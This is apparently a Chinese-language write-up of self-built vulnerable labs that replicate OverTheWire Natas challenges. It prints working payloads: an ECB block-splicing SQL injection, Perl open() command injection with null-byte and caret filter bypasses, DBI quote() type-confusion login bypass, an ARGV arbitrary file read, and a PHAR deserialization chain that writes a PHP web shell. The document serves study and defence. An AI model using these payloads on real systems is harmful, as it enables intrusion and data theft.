# S3 補強：五個新缺口（ECB / Perl × 3 / PHAR）

> 補強 OverTheWire Natas 全部通關後發現的五個缺口。
>
> 對應研究報告 **CH06 S1**，延續 **S2j（Natas 完結）**。

- 日期：2026-10-20
- 新增靶場：`ecblab/`、`perllab/`、`pharlab/`
- **驗證結果：ECB 4/4、Perl 3/3、PHAR 2/2（合計 9/9）**
- **環境**：真實 PHP 8.3.35 + 真實 Perl 5.42.3

---

## 一、五個缺口與補強方式

| # | 缺口 | 靶場 | 真實環境 | 結果 |
|---|---|---|---|---|
| 1 | **ECB block 操作** | `ecblab` | Python + pycryptodome | ✅ 4/4 |
| 2 | **Perl `open()` 命令注入** | `perllab` P29 | 真實 Perl 5.42.3 CGI | ✅ |
| 3 | **DBI `quote()` 型別混淆** | `perllab` P30 | 真實 Perl CGI | ✅ |
| 4 | **CGI `param()` + ARGV** | `perllab` P31 | 真實 Perl CGI | ✅ |
| 5 | **PHAR 反序列化** | `pharlab` | 真實 PHP 8.3.35 | ✅ 2/2 |

### 環境建置

| 元件 | 來源 | 大小 |
|---|---|---|
| **PHP 8.3.35** | windows.php.net（先前已下載） | 32 MB |
| **Perl 5.42.3** | Strawberry Perl GitHub release（portable） | 291 MB |
| **pycryptodome** | pip | — |

---

## 二、缺口 1：ECB block 操作攻擊（ecblab）

### 靶場設計

```
明文 = PREFIX(37) + addslashes(query) + SUFFIX(27)
     = "SELECT * FROM joke WHERE joke LIKE '%" + <query> + "%' ORDER BY id ASC LIMIT 10"
加密 = AES-ECB（固定金鑰）
```

### 四項驗證

| # | 項目 | 手法 | 結果 |
|---|---|---|---|
| E1 | ECB 模式偵測 | 用 `"B"*11 + "A"*32` 讓 A 對齊 block → 重複 block | ✅ |
| E2 | 對照：直接注入被擋 | `' OR 1=1 -- ` 被 addslashes 轉義成 `\'` | ✅ |
| E3 | **Block Splicing** | `C1[0:48] + C2[48:]` 去掉反斜線 | ✅ |
| — | 安全對照 | AES-GCM 篡改 → 403 | ✅ |

### E1 的關鍵：對齊

```
PREFIX = 37 字元，query 從 offset 37 開始
要讓 "A"*16 對齊到 block 邊界（offset 48）：
  query = "B"*11 + "A"*32
  → block 3 和 block 4 都是 "A"*16 → 重複 ✓
```

### E3 的關鍵：拼接

```
C1（query="A"*10）  block2 = PREFIX[32:37] + "A"*10 + "%"
C2（query="A"*10 + "' OR 1=1 -- "） block2 = 同上但結尾是 "\"

拼接 C1[:48] + C2[48:] → 去掉 "\" → 單引號裸露
→ SQL: ... LIKE '%AAAAAAAAAA%' OR 1=1 -- ...
→ 查詢成功（返回所有 joke）
```

---

## 三、缺口 2：Perl `open()` 命令注入（perllab P29）

### 真實 Perl CGI 環境

用 Python 的 CGI 包裝器（`srv.py`）把 HTTP 請求轉成 CGI 環境變數，
再用 `subprocess` 執行真實 Perl 腳本。

### 四層驗證

```
① 正常：/p29?file=perl+underground → open 失敗（.txt 不存在）
② 命令執行：/p29?file=|echo+hello%00 → 輸出 "hello" ✓
③ 過濾：/p29?file=|type+secrets/secret.txt%00 → "被過濾" ✓
④ 繞過：/p29?file=|type+secre^ts\secr^et.txt%00
        → FLAG{perl_open_command_injection_2026} ✓
```

### 三道關卡

| 關卡 | 問題 | 繞過 |
|---|---|---|
| ① | `open(FD, "$f.txt")` | `|` 前綴 → 命令執行 |
| ② | `.txt` 後綴 | `%00` null byte 截斷（**實測 Windows Perl 有效**） |
| ③ | `secret` 被過濾 | `^` 轉義（cmd）／`''`（Linux shell） |

---

## 四、缺口 3：DBI `quote()` 型別混淆（perllab P30）

### 漏洞機制

```perl
my $query = "... username=" . $dbh->quote(param('username'))
          . " AND password=" . $dbh->quote(param('password'));
```

**兩層漏洞**：
1. `param('password')` 在**列表上下文**返回多值
   → `password=X&password=2` 讓 `quote($value, $type)`
2. DBI 的 `quote($value, $type)`：type=NUMERIC(2) 時**不加引號**

### 實測

```
POST username=admin&password='xxx' or 1=1 &password=2
→ query = SELECT * FROM users WHERE username='admin' AND password='xxx' or 1=1
→ WIN! FLAG{dbi_quote_type_confusion_2026}
```

### ★ 誠實標註

> `param()` 多值是**真實 Perl CGI 行為**；
> 但 **DBD::mysql** 的型別參數在 **DBD::SQLite** 中被忽略
> （實測：所有 type 值都正常 quote）。
> 因此靶場用 `quote_mysql()` **明確模擬** DBD::mysql 的型別行為，並在程式碼中標註。

---

## 五、缺口 4：CGI `param()` + ARGV（perllab P31）

### 三層誤解

| 假設 | 實際 |
|---|---|
| `upload('file')` 檢查所有 file 都是檔案 | **只要求其中一個** |
| `param('file')` 返回 filehandle | 多值時返回列表，標量取**第一個** |
| `<>` 只讀檔案 | 對字串 **`ARGV`** 會遍歷 `@ARGV` |

### 實測

```
POST /p31?secrets/secret.txt
  multipart: file=ARGV + file=@dummy
→ @ARGV = ("secrets/secret.txt")
→ param('file') 標量 = "ARGV"
→ <> 遍歷 @ARGV → 讀取 secrets/secret.txt
→ FLAG{perl_open_command_injection_2026} ✓

POST /p31?C:/Windows/win.ini
→ 讀到 Windows 系統檔（證明任意檔案）✓
```

### 實作細節

Python CGI 包裝器模擬 Apache 行為：
- `QUERY_STRING` 若不含 `=`，分割後作為 `@ARGV`
- 需要 **URL 解碼** 每個參數

---

## 六、缺口 5：PHAR 反序列化（pharlab）

### 靶場設計

```php
class Logger {
    public $logFile, $initMsg, $exitMsg;
    function __destruct() {
        @file_put_contents($this->logFile, $this->exitMsg, FILE_APPEND);
    }
}
```

### 攻擊鏈

```
① 用本機 PHP 生成 PHAR（metadata = Logger 物件）
   logFile = upload/shell.php
   exitMsg = '<?php ... ?>'
② 上傳 PHAR
③ 觸發：/check?f=phar://.../payload.phar/test.txt
④ metadata 反序列化 → Logger::__destruct()
⑤ 寫入 shell.php → RCE
```

### 實測

```
metadata type: Logger
shell.php 存在（88 bytes）
destruct.log 存在（179 bytes）
```

### ★ 重要發現：PHP 8.3 已緩解

| 觸發方式 | PHP 8.3 結果 |
|---|---|
| `file_exists("phar://...")` | ❌ **不反序列化** |
| `file_get_contents` | ❌ 不反序列化 |
| `md5_file` | ❌ 不反序列化 |
| `is_file` / `filemtime` / `stat` / `fopen` | ❌ 不反序列化 |
| **明確 `getMetadata()`** | ✅ **反序列化** |

> **PHP 8.3 已不再對「檔案操作」自動反序列化 PHAR metadata**。
> natas33 用的是舊版 PHP，所以仍可攻擊。
>
> 本靶場用**明確 `getMetadata()`** 模擬舊版行為，並在程式碼中標註。

---

## 七、三個靶場的驗證結果

| 靶場 | 項目 | 結果 |
|---|---|---|
| `ecblab` | E1/E2/E3 + GCM 對照 | **4/4** |
| `perllab` | P29/P30/P31 | **3/3** |
| `pharlab` | PHAR + 安全對照 | **2/2** |
| **合計** | | **9/9** |

---

## 八、這五個缺口的共同主題

### 主題 1：「加密」不等於「完整性」

ECB 的 block 拼接、PHAR 的 metadata 反序列化——
**攻擊者不需要金鑰或密碼，只需操作資料結構**。

### 主題 2：「上下文」決定行為

Perl 的 `param()`：
- 標量上下文 → 取第一個值
- 列表上下文 → 返回所有值

**同一個函式，不同呼叫情境，行為完全不同**——這是三個 Perl 缺口的共同根源。

### 主題 3：版本差異是滲透測試的關鍵

| 漏洞 | PHP 7 | PHP 8.3 |
|---|---|---|
| `strcmp(array)` | NULL → 繞過 | TypeError |
| PHAR 檔案操作反序列化 | ✅ 觸發 | ❌ 已緩解 |

**實測確認，不靠記憶。**

---

## 九、檔案

```
vuln-lab/
├── ecblab/
│   ├── ecblab.py              # ECB 靶場（4 項驗證）
│   ├── verify_ecblab.py       # 驗證（4/4）
│   └── ecb.db
├── perllab/
│   ├── srv.py                 # HTTP → CGI 包裝
│   ├── p29.pl / p30.pl / p31.pl
│   ├── verify_perllab.py      # 驗證（3/3）
│   └── secrets/secret.txt
└── pharlab/
    ├── pharlab.php            # PHAR 靶場
    ├── gen_phar_lab.php       # PHAR 生成器
    ├── verify_pharlab.py      # 驗證（2/2）
    └── upload/
```

**複現**：
```powershell
# ECB
python vuln-lab/ecblab/ecblab.py 8980
python vuln-lab/ecblab/verify_ecblab.py 8980

# Perl
python vuln-lab/perllab/srv.py 8990
python vuln-lab/perllab/verify_perllab.py 8990

# PHAR
php -S 127.0.0.1:8991 -t . pharlab.php
python vuln-lab/pharlab/verify_pharlab.py 8991
```

---

## 十、結論

### 補強成果

| 缺口 | 狀態 |
|---|---|
| ECB block 操作攻擊 | ✅ 4/4 |
| Perl `open()` 命令注入 | ✅ |
| DBI `quote()` 型別混淆 | ✅（明確標註模擬部分） |
| CGI `param()` + ARGV | ✅ |
| PHAR 反序列化 | ✅ 2/2（標註 PHP 8.3 已緩解） |

### 本專案現在的完整度

```
靶場：22 個（新增 ecblab、perllab、pharlab）
驗證型態：24 種（新增 ECB block、Perl 上下文、PHAR）
報告：34 份
```

---

*本文件為教育用途的實作記錄。使用本機下載的 PHP 8.3.35 與 Perl 5.42.3，
所有測試 100% 在本機自建靶場完成。*
